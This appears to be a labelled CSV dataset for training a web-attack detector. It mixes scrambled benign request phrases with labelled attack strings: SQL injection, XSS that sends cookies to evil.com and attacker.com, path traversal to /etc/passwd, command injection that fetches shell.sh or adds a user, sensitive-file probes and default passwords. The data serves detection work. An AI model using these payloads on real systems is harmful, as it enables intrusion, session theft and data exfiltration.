text,label
specifications compare products two req1081,0
view for product policy return req669,0
username=admin&password=monkey,1
store for check availability item req991,0
"id=1 AND 1=CONVERT(int,@@version)--",1
30 history view last for req756,0
1; DROP TABLE users--,1
billing for address update account req729,0
contact refund for request support req404,0
GET /.env HTTP/1.1,1
jpeg upload picture req211,0
../../../../var/www/html/config.php,1
new with email req358,0
%3Cscript%3Ealert(1)%3C/script%3E,1
view terms page conditions and req537,0
<svg onload=alert(document.domain)>,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
; cat /etc/shadow,1
`id`,1
and username password req1052,0
& ipconfig,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
; cat /etc/shadow,1
product item add to cart req385,0
username=admin&password=123456,1
file:///etc/passwd,1
id=2 OR 1=1,1
| uname -a,1
email with newsletter to subscribe req277,0
panel notification settings view req1069,0
1'; EXEC xp_cmdshell('whoami')--,1
GET /api/swagger.json HTTP/1.1,1
and login username req582,0
GET /crossdomain.xml HTTP/1.1,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
file:///etc/passwd,1
GET /config.bak HTTP/1.1,1
GET /server-status HTTP/1.1,1
../../../../var/www/html/config.php,1
<body background=javascript:alert(1)>,1
file:///etc/passwd,1
notification view settings panel req588,0
tracking track number with req804,0
checkout credit with card req331,0
brute force attempt on login endpoint from single ip,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
password spray attack detected multiple users,1
GET /wp-admin HTTP/1.1,1
1' ORDER BY 10--,1
<SCRIPT>alert('XSS')</SCRIPT>,1
../../../../proc/self/environ,1
as report export data csv req928,0
username=admin&password=admin,1
number order download for req707,0
<body onload=alert('XSS')>,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
GET /actuator/env HTTP/1.1,1
newest sort listing req92,0
& ipconfig,1
GET /backup.sql HTTP/1.1,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
for days history req136,0
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
GET /phpmyadmin HTTP/1.1,1
1' OR 1=1--,1
link reset via req315,0
1' OR '1'='1,1
<textarea onfocus=alert(1) autofocus>,1
on map locations req963,0
; id,1
../../../../etc/passwd,1
authentication factor two enable req176,0
username=test&password=test,1
email password link req567,0
| wget http://attacker.com/shell.sh,1
username=admin&password=qwerty,1
view policy product return for req596,0
../../../../proc/self/environ,1
1' GROUP BY 1--,1
two authentication factor enable req1001,0
GET /config.bak HTTP/1.1,1
wishlist item later to save for req876,0
"1 UNION SELECT @@version,NULL--",1
1' ORDER BY 10--,1
reset email password via req965,0
GET /console HTTP/1.1,1
GET /.git/config HTTP/1.1,1
id=2 OR 1=1,1
username=root&password=root,1
1; DROP TABLE users--,1
account for billing update req576,0
username=admin&password=abc123,1
<script>alert('XSS')</script>,1
coupon at checkout req101,0
& ipconfig,1
....//....//etc/passwd,1
set preference to express delivery req163,0
"1 AND 1=2 UNION SELECT 1,2,3--",1
& net user hacker Password1 /add,1
brute force attempt on login endpoint from single ip,1
; id,1
username=admin&password=qwerty,1
; id,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
' OR 'x'='x,1
view section related products req808,0
username=admin&password=admin123,1
shipment with number tracking track req146,0
"';alert(String.fromCharCode(88,83,83))//",1
../../../../proc/self/environ,1
factor enable authentication req1186,0
login attempt failed username admin invalid credentials,1
store on map locations view req1065,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
for request refund contact support req566,0
username=admin&password=superman,1
GET /.env HTTP/1.1,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
checkout with payment req691,0
for update address billing account req998,0
logout session from current req750,0
articles feed get news req426,0
GET /server-status HTTP/1.1,1
email link reset password via req958,0
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
../../wp-config.php,1
<select onfocus=alert(1) autofocus>,1
<script>alert('XSS')</script>,1
